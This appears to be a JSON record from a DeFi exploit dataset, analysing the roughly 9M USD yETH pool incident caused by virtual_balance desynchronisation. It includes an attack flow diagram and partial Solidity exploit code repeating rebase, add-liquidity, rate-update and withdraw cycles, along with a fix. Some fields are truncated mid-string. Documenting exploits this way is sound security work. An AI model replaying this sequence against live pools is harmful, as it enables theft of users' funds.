@@ -1,0 +1,30 @@
+{
+ "id": "2025__2025-12-10_yETH_VirtualBalance-Manipulation",
+ "source_file": "2025/2025-12-10_yETH_VirtualBalance-Manipulation.md",
+ "title": "yETH — Virtual Balance Manipulation Analysis",
+ "date": "2025-12-10",
+ "protocol": "yETH",
+ "chain": "Ethereum",
+ "loss_raw": "~9,000,000 USD",
+ "loss_usd": null,
+ "root_cause": "Mismatch between `virtual_balance` and actual balance before/after `update_rates` call, allowing excess withdrawals upon LP redemption",
+ "attack_tx": "0x53fe7ef1...",
+ "vulnerable_contract": "0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81",
+ "classes": [
+  "business-logic"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: virtual_balance mismatch before/after update_rates\ninterface IPool {\n    function virtual_balance(uint256 index) external view returns (uint256);\n    function supply() external view returns (uint256);\n\n    // After update_rates is called, each asset's rate is updated\n    // However, virtual_balance may not be updated immediately\n    function update_rates(uint256[] calldata _assets) external;\n\n    function remove_liquidity(\n        uint256 _lp_amount,\n        uint256[] calldata _min_amounts,\n        address _receiver\n    ) external;\n}\n\n// Calling oETH.rebase() increases oETH's actual balance, but\n// the pool's virtual_balance retains the old value since update_rates hasn't been called yet\n// → Discrepancy occurs when calculating LP token value → excess withdrawal possible\n\n//"
+ ],
+ "code_after": [
+  "✅ Fix: automatically update rates before remove_liquidity\nfunction remove_liquidity(...) external {\n    _update_all_rates(); // Update all rates before withdrawal\n    ...\n}"
+ ],
+ "steps": [
+  "virtual_balance updated → LP value increases",
+  "[8] ▶ Swap all assets to wETH → ~9M USD extracted"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─[Phase 1: Initial Balance Setup]\n  │   ├─[1]─▶ Acquire multiple LST tokens (via flash loan or purchase)\n  │   └─[2]─▶ Add initial liquidity to pool\n  │\n  ├─[Phase 2: Initial rates Update]\n  │   └─[3]─▶ Call pool.update_rates()\n  │             Synchronize virtual_balance\n  │\n  ├─[Phase 3: Exploit Cycle (repeated)]\n  │   ├─[4]─▶ Call oETH.rebase()\n  │   │         └─ oETH actual balance increases (virtual_balance still holds old value)\n  │   │\n  │   ├─[5]─▶ Call pool.add_liquidity([oETH_amount, ...])\n  │   │         └─ Receive LP tokens based on actual balance (favorable terms)\n  │   │\n  │   ├─[6]─▶ Call pool.update_rates()\n  │   │         └─ virtual_balance updated → LP value increases\n  │   │\n  │   └─[7]─▶ Call pool.remove_liquidity(lp_amount, ...)\n  │             └─ Receiv",
+  "function _executeExploitSequence() internal {\n    // Repeat exploit cycle\n    for (uint256 i = 0; i < EXPLOIT_ROUNDS; i++) {\n        _executePhase1(); // oETH rebase + add liquidity\n        _executePhase2(); // update rates + remove liquidity (excess withdrawal)\n    }\n}\n\nfunction _executePhase1() internal {\n    // [1] oETH rebase: actual balance increases, virtual_balance retains old value\n    IOETH(oETH).rebase();\n\n    // [2] Add liquidity based on actual balance (favorable rate)\n    uint256[] memory amounts = new uint256[](NUM_ASSETS);\n    amounts[oETHIndex] = IERC20(oETH).balanceOf(address(this));\n    pool.add_liquidity(amounts, 0, address(this));\n}\n\nfunction _executePhase2() internal {\n    // [3] Update rates → LP token value increases\n    uint256[] memory rateAssets = new uint256[](NU"
+ ]
+}
